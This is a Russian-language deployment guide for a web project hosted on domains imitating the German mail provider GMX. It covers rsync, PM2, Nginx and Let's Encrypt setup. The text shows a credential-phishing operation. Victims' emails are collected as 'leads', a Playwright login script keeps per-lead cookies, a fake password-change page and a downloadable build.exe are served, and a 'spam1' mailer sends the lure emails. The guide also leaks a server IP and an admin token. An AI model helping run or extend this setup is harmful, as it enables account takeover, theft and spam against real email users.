# Деплой на gmx-de.help (один вариант)

Используем: **rsync** для загрузки, **PM2** для процесса, **Nginx** + **Let's Encrypt** для домена и HTTPS.

---

## Production: обязательно на проде

- **ADMIN_TOKEN** — задай в `.env` или в окружении. Без токена админка открыта без пароля. При `NODE_ENV=production` и пустом `ADMIN_TOKEN` процесс **не запустится** (exit 1).
- **NODE_ENV=production** — задай на проде (в `.env` или в PM2 ecosystem), чтобы включить проверку токена и production-режим.
- **Ротация логов и бэкапов:** настрой cron, например раз в неделю: `cd /var/www/... && npm run cleanup` (или `npm run cleanup:full`). Иначе `data/backups/` и `data/debug.log` могут заполнить диск.

---

## Шпаргалка: обновить код и перезапустить без потери данных

**Не трогаем и никогда не удаляем на сервере:** `data/`, `.env`, `node_modules/`, `downloads/`, `login/.venv`, `login/cookies/` — при rsync они **исключаются**. Лиды и все базы хранятся в `data/` и дополняются в реальном времени; с сервера их **никогда не удалять**. На сервере для скрипта входа (AUTO-Script) **venv не нужен** — используется системный `python3`.

**Скрипт** (подставь свой `RSYNC_DEST` при необходимости). Пароль/ключ SSH запрашивается **один раз** (далее переиспользуется одно соединение):

```bash
cd /Users/greedy/Desktop/gmx
export RSYNC_DEST="root@166.0.150.132:/var/www/gmx-net.help/"
./deploy-rsync.sh
```

**Или одной командой:**

```bash
rsync -avz --delete \
  --exclude 'node_modules' --exclude 'data' --exclude '.env' --exclude 'downloads' \
  --exclude 'login/.venv' --exclude 'login/cookies' \
  /Users/greedy/Desktop/gmx/ root@166.0.150.132:/var/www/gmx-net.help/
```

Чтобы обновить на сервере файлы в **downloads/** (например, новый build.exe), залей их отдельно:  
`rsync -avz /Users/greedy/Desktop/gmx/downloads/ root@...:/var/www/gmx-net.help/downloads/`

**На сервере** — зависимости и перезапуск (процесс в PM2 называется `gmx-net`):

```bash
ssh root@166.0.150.132
cd /var/www/gmx-net.help && npm install && pm2 restart gmx-net && pm2 save
```

Один процесс = весь проект: при `npm start` (или `pm2 start server.js`) поднимается и сервер, и скрипт входа (если в админке выбран режим **AUTO-Script**). Скрипт запускается системным `python3`, venv не нужен. Один раз на сервере установите зависимости: `cd /var/www/gmx-net.help/login && pip3 install -r requirements.txt && python3 -m playwright install chromium`.

**Хранение данных (никогда не удалять):** все лиды и базы лежат в каталоге `data/` (leads.json, all.txt, chat.json, backups/, конфиги загрузок и т.д.) и в `login/cookies/` (куки по лидам для режима Script). Они дополняются в реальном времени. При деплое rsync эти каталоги не трогает. На сервере **запрещено** выполнять удаление или перезапись `data/` и `login/cookies/` — только добавление/обновление записей.

**Канонический домен:** по умолчанию сейчас **gmx-net.cv** — с gmx-net.info и других доменов идёт редирект на него (в т.ч. страница смены пароля). Чтобы оставить основным другой домен, задай в `.env` на сервере, например: `CANONICAL_DOMAIN=gmx-net.info`.

---

### Добавить домен gmx-net.cv (Nginx + SSL)

Домен **gmx-net.cv** уже задан в коде как основной; нужно только принять его в Nginx и выдать сертификат.

**1. Залить конфиг на сервер** (с твоего Mac):
```bash
scp /Users/greedy/Desktop/gmx/nginx-gmx-net.cv.conf root@166.0.150.132:/etc/nginx/sites-enabled/gmx-net.cv
```

**2. На сервере:** проверить Nginx и перезагрузить:
```bash
nginx -t && systemctl reload nginx
```

**3. Выдать SSL для gmx-net.cv:**
```bash
certbot certonly --webroot -w /var/www/certbot -d gmx-net.cv -d www.gmx-net.cv
```

**4. Включить HTTPS для gmx-net.cv:** на сервере отредактировать `/etc/nginx/sites-enabled/gmx-net.cv` — раскомментировать блок `server { listen 443 ssl; ... }` (строки с `listen 443`, `ssl_certificate`, `location /` и т.д.). Затем:
```bash
nginx -t && systemctl reload nginx
```

После этого **https://gmx-net.cv** и **https://www.gmx-net.cv** будут открывать тот же сайт; с **gmx-net.info** и остальных доменов будет редирект на **https://gmx-net.cv**.

---

### Если в логах `EADDRINUSE: address already in use 0.0.0.0:3000`

Порт 3000 занят другим процессом, **gmx-net** не может запуститься. Сделай так:

**1. Узнать, кто занял порт 3000:**
```bash
lsof -i :3000
# или
ss -tlnp | grep 3000
```

**2. Вариант А — другой процесс в PM2 (например gmw или старый gmx):**
```bash
pm2 list
pm2 stop gmw    # или как называется процесс
pm2 delete gmx-net
cd /var/www/gmx-net.help
pm2 start server.js --name gmx-net
pm2 save
```

**2. Вариант Б — оставить gmx-net на порту 3001:** в `.env` на сервере задай `PORT=3001`. Тогда в Nginx для **grzl.org** и **gmx-net.info** в `proxy_pass` должен быть `http://127.0.0.1:3001;`. После этого:
```bash
pm2 delete gmx-net
cd /var/www/gmx-net.help
pm2 start server.js --name gmx-net
pm2 save
```

Проверка: `curl -I http://127.0.0.1:3000` или `curl -I http://127.0.0.1:3001` — должен ответить тот порт, на котором слушает приложение.

---

### Восстановить прошлые логи из бэкапа

Перед каждой записью в `data/leads.json` сервер кладёт копию в `data/leads.json.backup`. Если логи пропали (пустой список в админке), восстанови с сервера:

```bash
cd /var/www/gmx-net.help/data
ls -la leads.json leads.json.backup
# Если в leads.json мало записей или пусто, а в .backup есть данные:
cp leads.json leads.json.broken
cp leads.json.backup leads.json
pm2 restart gmx-net
```

Проверка: открой https://grzl.org/admin — должны появиться старые записи.

---

### Логи не приходят в админку / новые визиты не создаются

**1. Один ли порт у приложения и Nginx**

На сервере приложение слушает порт из `.env` (например `PORT=3001`). Nginx должен проксировать и **gmx-net.info**, и **grzl.org** на этот же порт:

```bash
grep -r "proxy_pass" /etc/nginx/sites-enabled/
```

Для grzl.org и gmx-net.info должно быть одно и то же значение, например `http://127.0.0.1:3001;`.

**2. Проверить, что визиты доходят до приложения**

Заходи на https://gmx-net.info, вводи почту и нажимай Weiter. На сервере смотри логи:

```bash
pm2 logs gmx-net --lines 30
```

Должны появиться строки вида `[SERVER] /api/visit` или `[SERVER] /api/submit`. Если их нет — запросы с gmx-net.info не доходят до Node (проверь Nginx `server_name` и `proxy_pass` для gmx-net.info).

**3. Канонический домен**

В `.env` не должно быть `CANONICAL_DOMAIN` с другим доменом. Либо не задавай переменную, либо `CANONICAL_DOMAIN=gmx-net.info`.

---

**Как узнать путь к проекту на другом сервере**

Подключись и выполни:

```bash
pm2 list
pm2 show ИМЯ_ПРОЦЕССА
```

В выводе смотри **script path** — это папка проекта. Или найди вручную:

```bash
find /root /var/www -name "server.js" -type f 2>/dev/null
```

Папка, в которой лежит `server.js`, — путь для rsync и для `cd`.

После rsync и `pm2 restart gmx-net`: обновлены код и `downloads/build.exe`, логи и записи в админке остаются на месте.

---

## На сервере (один раз)

### 0. Найти старую версию (если она в root)

Подключиться под root или с sudo:

```bash
ssh root@IP_СЕРВЕРА
```

Найти папку проекта:

```bash
find /root -name "server.js" -type f 2>/dev/null
```

Или по названию:

```bash
ls -la /root
ls -la /root/gmx*   # если папка называлась gmx или gmx-de.help
```

Узнать, откуда запущен процесс (если стоит PM2):

```bash
pm2 list
pm2 show gmx
```

В выводе `pm2 show gmx` будет **script path** — это и есть папка старой версии (например `/root/gmx` или `/root/gmx-de.help`).

Остановить и запомнить путь для бэкапа при необходимости:

```bash
pm2 stop gmx
# Пусть старая папка остаётся в /root (например /root/gmx) — не трогаем.
# Новую версию кладём в /var/www/gmx-de.help (шаг 1 ниже).
```

---

### 1. Подготовка папки и PM2

```bash
ssh user@IP_СЕРВЕРА

sudo mkdir -p /var/www/gmx-de.help
sudo chown $USER:$USER /var/www/gmx-de.help
```

Если старая версия уже в `/var/www/gmx-de.help`:

```bash
cd /var/www/gmx-de.help
pm2 stop gmx
cd /var/www
mv gmx-de.help gmx-de.help.backup
mkdir gmx-de.help
```

(или просто очистите содержимое: `rm -rf /var/www/gmx-de.help/*` после `pm2 stop gmx`)

Установка PM2 (если ещё нет):

```bash
sudo npm install -g pm2
```

---

## С вашего компьютера

### 2. Загрузка кода (rsync)

Подставьте свой `user` и `IP_СЕРВЕРА`:

```bash
rsync -avz --exclude 'node_modules' --exclude 'data' --exclude '.env' \
  /Users/greedy/Desktop/gmx/ user@IP_СЕРВЕРА:/var/www/gmx-de.help/
```

Файл `.env` не копируем — его создаём вручную на сервере (токен не уезжает с машины).

---

## Снова на сервере

### 3. Зависимости и .env

```bash
cd /var/www/gmx-de.help
npm install ws dotenv
mkdir -p data
nano .env
```

В `.env` (создать, если нет):

```
ADMIN_TOKEN=ваш_длинный_секретный_токен
PORT=3000
```

**Какой токен?** Это вы придумываете сами — пароль для входа в админку. Один и тот же текст пишете в `.env` и в ссылке: `https://gmx-de.help/admin?token=ЭТОТ_ЖЕ_ТОКЕН`. Сгенерировать случайный (на своей машине): `openssl rand -hex 16`.

Сохранить: `Ctrl+O`, Enter, `Ctrl+X`.

### 4. Запуск через PM2

```bash
pm2 start server.js --name gmx
pm2 save
pm2 startup
```

Команду из вывода `pm2 startup` выполнить (если попросит).

### 5. Nginx для gmx-de.help

```bash
sudo nano /etc/nginx/sites-available/gmx-de.help
```

Вставить (заменить содержимое файла):

```nginx
server {
    listen 80;
    server_name gmx-de.help www.gmx-de.help;
    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

Включить сайт и перезагрузить Nginx:

```bash
sudo ln -sf /etc/nginx/sites-available/gmx-de.help /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

### 6. HTTPS (Let's Encrypt)

```bash
sudo apt update
sudo apt install -y certbot python3-certbot-nginx
sudo certbot --nginx -d gmx-de.help -d www.gmx-de.help
```

Следуйте подсказкам (email, согласие). Certbot сам настроит HTTPS и редирект с HTTP.

---

## Проверка

- Сайт: **https://gmx-de.help**
- Админка: **https://gmx-de.help/admin?token=ВАШ_ТОКЕН**

---

## Если /admin отдаёт «Not Found»

На сервере выполните по порядку:

**1. Приложение запущено и слушает порт 3000?**

```bash
pm2 list
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:3000/admin
```

Должно быть `200`. Если пусто или ошибка — запустите приложение из папки проекта:

```bash
cd /var/www/gmx-de.help
pm2 start server.js --name gmx
pm2 save
```

**2. В папке есть admin.html?**

```bash
ls -la /var/www/gmx-de.help/admin.html
```

Если «No such file» — проект залит не в ту папку или не залит; заново выполните rsync из раздела «Загрузка кода».

**3. Nginx проксирует на порт 3000?**

```bash
sudo nginx -T 2>/dev/null | grep -A5 "server_name gmx-de.help"
```

Должно быть `proxy_pass http://127.0.0.1:3000`. Если нет — включите конфиг из раздела «Nginx для gmx-de.help» и сделайте `sudo nginx -t && sudo systemctl reload nginx`.

**4. Проверка с сервера напрямую**

```bash
curl -I "http://127.0.0.1:3000/admin?token=f0b25861e7987f732f8789dec0e66f90"
```

В первой строке ответа должно быть `HTTP/1.1 200 OK`. Если здесь 200, а в браузере по домену — Not Found, значит проблема в Nginx или DNS (открывается не тот сервер).

---

## Обновление (следующие разы)

Чтобы при обновлении **не сбросились логи в админке gmx** и **конфиги/загрузки майлера**, делайте так.

**1. На сервере — бэкап перед обновой:**

```bash
ssh root@IP_СЕРВЕРА
mkdir -p /root/backups/gmx-de-help /root/backups/gmx-net-help /root/backups/mailer
# Логи gmx (админка)
cp -a /var/www/gmx-de.help/data /root/backups/gmx-de-help/data-$(date +%Y%m%d-%H%M)
cp -a /var/www/gmx-net.help/data /root/backups/gmx-net-help/data-$(date +%Y%m%d-%H%M)
# Конфиги и загрузки майлера (если майлер уже развёрнут)
cp -a /var/www/mailer/configs /root/backups/mailer/configs-$(date +%Y%m%d-%H%M) 2>/dev/null || true
cp -a /var/www/mailer/uploads /root/backups/mailer/uploads-$(date +%Y%m%d-%H%M) 2>/dev/null || true
```

(Если один сайт gmx — оставьте только нужные строки. Если майлера ещё нет — строки с `mailer` можно не выполнять.)

**2. С вашего компьютера — залить код (data и конфиги майлера не трогаем):**

```bash
# GMX — папку data/ не копируем, логи остаются на сервере
rsync -avz --exclude 'node_modules' --exclude 'data' --exclude '.env' \
  /Users/greedy/Desktop/gmx/ root@IP_СЕРВЕРА:/var/www/gmx-de.help/
rsync -avz --exclude 'node_modules' --exclude 'data' --exclude '.env' \
  /Users/greedy/Desktop/gmx/ root@IP_СЕРВЕРА:/var/www/gmx-net.help/

# Майлер — папки configs/ и uploads/ не копируем, конфиги и картинки остаются на сервере
rsync -avz --exclude 'configs' --exclude 'uploads' --exclude 'venv' --exclude '__pycache__' --exclude '*.pyc' --exclude '.env' \
  /Users/greedy/Desktop/spam1/ root@IP_СЕРВЕРА:/var/www/mailer/
```

**3. На сервере — зависимости и перезапуск:**

```bash
# GMX
cd /var/www/gmx-de.help && npm install && pm2 restart gmx
cd /var/www/gmx-net.help && npm install && pm2 restart gmx-net

# Майлер (если развёрнут)
cd /var/www/mailer && source venv/bin/activate && pip install -r requirements.txt -q && pm2 restart mailer

pm2 save
```

Готово. Логи gmx — в `/var/www/.../data/`, бэкапы — в `/root/backups/`. Конфиги майлера — в `/var/www/mailer/configs/`, загрузки — в `/var/www/mailer/uploads/`.

---

## Майлер на https://gmx-net.help/mailer/

Майлер (приложение рассылки) доступен по подпути **https://gmx-net.help/mailer/**; Nginx проксирует запросы на `http://127.0.0.1:5050`.

### 1. Где лежит майлер на сервере

Разместите проект майлера (spam1) в отдельной папке, например `/var/www/mailer`:

```bash
# с вашего компьютера (из папки, где лежит проект майлера)
rsync -avz --exclude '__pycache__' --exclude '*.pyc' --exclude '.env' \
  /Users/greedy/Desktop/spam1/ root@IP_СЕРВЕРА:/var/www/mailer/
```

На сервере:

```bash
cd /var/www/mailer
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
# при необходимости создайте .env
```

### 2. Запуск майлера (PM2)

Чтобы майлер слушал порт 5050 и перезапускался после перезагрузки:

```bash
cd /var/www/mailer
pm2 start "venv/bin/gunicorn -w 1 -b 127.0.0.1:5050 app:app" --name mailer
pm2 save
```

(Если нет gunicorn: `pip install gunicorn` в venv. Для отладки можно `pm2 start "venv/bin/python app.py" --name mailer` — в app.py порт 5050.)

### 3. Nginx: location /mailer/ для gmx-net.help

В конфиг сайта **gmx-net.help** добавьте блок `location /mailer/` (внутри уже существующего `server { server_name gmx-net.help; ... }`):

```bash
sudo nano /etc/nginx/sites-available/gmx-net.help
```

Внутри `server { ... }` для gmx-net.help добавьте:

```nginx
    location /mailer/ {
        proxy_pass http://127.0.0.1:5050/;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Forwarded-Prefix /mailer;
    }
```

Проверка и перезагрузка Nginx:

```bash
sudo nginx -t && sudo systemctl reload nginx
```

После этого админка майлера: **https://gmx-net.help/mailer/**
